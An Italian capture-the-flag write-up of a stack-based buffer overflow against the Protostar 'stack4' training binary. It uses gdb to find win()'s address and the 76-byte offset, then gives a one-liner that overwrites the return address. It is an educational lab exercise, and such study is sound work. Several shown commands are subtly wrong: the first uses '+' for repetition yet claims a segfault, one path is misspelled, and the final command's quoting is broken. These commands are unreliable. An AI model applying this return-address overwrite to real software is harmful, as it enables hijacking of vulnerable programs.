# Protostar_stack 4 - Stack-based buffer overflow

## Obiettivo della sfida
Eseguire la funzione _win()_ a tempo di esecuzione, ciò modifica il flusso di esecuzione poichè provoca il salto del codice alla funzione _win()_

## Tentativo
Proviamo a mandere in buffer overflow la variabile _buffer_ con:
```bash
> python -c 'print "a" + 80' | /opt/protostar/stack4
#output
Segmentation fault
```
Il programma scrive le prime 64 "a" in _buffer_ e le restanti vengono scritte in locazioni contigue alcune riservate alla memorizzazione della variabile EBP per la gestione dello stack.
### Riflessione
A differenza della sfida precedente qui non abbiamo una variabile esplicita da sovrascrivere. Abbiamo bisogno di una cella che se sovrascritta provoca l'alterazione del flusso di esecuzione.

### Indirizzo di ritorno
Essa è una cella di dimensioni pari all'architettura(4 byte per Protostar) e contiene l'indirizzo della prima istruzione da eseguire al termine della funzione descritta nello stack frame.

## Strategia di attacco
Sovrascrivere l'indirizzo di ritorno con quello della funzione _win()_ per farlo occorre scoprire l'indirizzo della cella di memoria che contiene l'indirizzo di ritorno e l'indirizzo della funzione _win()_

### Recuperare l'indirizzo di win()
Utilizziamo **gdb**
```bash
> gdb -q /opt/protstar/bin/stack4
(gdb) > p win
$1 = {void (void)} 0x80483f4 <win>
# 0x80483f4 indirizzo di win()
```

### Recuperare l'indirizzo di ritorno
Per ottenere l'indirizzo di ritorno di _main()_ è necessario ricostruire il **layout dello stack** di _stack4_ per farlo(senza il sorgente) bisogna disassemblare il main e possiamo farlo con la funzione **disassemble** di gdb quindi lanciamo
```bash
(gdb) > disassemble main
# Dump of assembler code
```
Analizziamo il dump e vediamo che i registri coinvolti sono:
- ESP: punta al top dello stack
- EBP: puntatore che consente di accedere alle variabili dell'interno frame

Inseriamo un **breakpoint** alla prima istruzione del main (abbiamo l'indirizzo perchè abbiamo il dump).
```bash
(gdb) > b *0x8048408
# breakpoint 1
# eseguiamo il programma
(gdb) > r
# monitoriamo l'evoluzione dello stack monitorando gli indirizzi di EBP e ESP ad ogni passo
(gdb) > p $ebp
$2 = (void *) 0xbffffdc8
(gdb) > p $esp
$3 = (void *) 0xbffffd4c
# 0xbffffd4c indirizzo di ritorno prima dell'esecuzione del main
# eseguiamo le istruzioni assembly passo dopo passo con
(gdb) > si
```

## Come sfruttare le vulnerabilità
Una volta seguita l'evoluzione dello stack possiamo capire quante "a" dobbiamo ripetere fino ad arrivare all'indirizzo di ritorno.  
Quindi dobbiamo dare in input un numero di a pari a  
`sizeof(buffer) + sizeof(padding) + sizeof(vecchio EBP)`.  
La dimensione del buffer è **64 byte** + la dimensione del padding è **8 byte** + dimensione del vecchio EBP che è **4 byte**, quindi possiamo dire che servono 76 "a" per arrivare all'indirizzo di ritorno, una volta arrivati a quell'indirizzo scriviamo l'indirizzo di _win()_ (al contrario perchè è Little Endian).

### Istruzioni da eseguire
```bash
> 'python -c 'print "a" * 76 + "\xf4\x83\x04\x08"'' | /opt/protostar/bin/stack4
# sfida vinta
Segmentation fault
```

## Commenti sulla sfida
Il crash è causato dal fatto che dopo l'esecuzione di _win()_ viene letto il valore successivo dello stack rovinato di conseguenza il programma crasha ma non ci interessa perchè la sfida è vinta.
